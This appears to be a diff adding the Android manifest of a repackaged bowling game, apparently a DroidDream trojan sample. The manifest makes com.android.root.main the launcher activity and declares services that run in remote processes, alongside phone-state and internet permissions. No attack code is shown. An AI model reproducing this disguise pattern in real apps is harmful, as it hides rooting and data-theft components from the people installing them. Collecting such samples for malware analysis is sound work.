@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="preferExternal" package="com.droiddream.bowlingtime">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:configChanges="fontScale|keyboard|keyboardHidden|orientation|uiMode" android:label="@string/app_name" android:name="cn.bluesky.fingerbowling.FingerBowling" android:screenOrientation="portrait"/>
+        <activity android:name="com.android.root.main">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <service android:name="com.android.root.Setting" android:process=":remote"/>
+        <service android:name="com.android.root.AlarmReceiver" android:process=":remote2"/>
+        <meta-data android:name="com.mobclix.APPLICATION_ID" android:value="E798E833-54EB-427E-8289-8E67B27B41AA"/>
+        <activity android:name="com.mobclix.android.sdk.MobclixBrowserActivity"/>
+        <provider android:authorities="com.droiddream.bowlingtime.localprovider" android:name="com.phonegap.LocalProvider"/>
+    </application>
+</manifest>
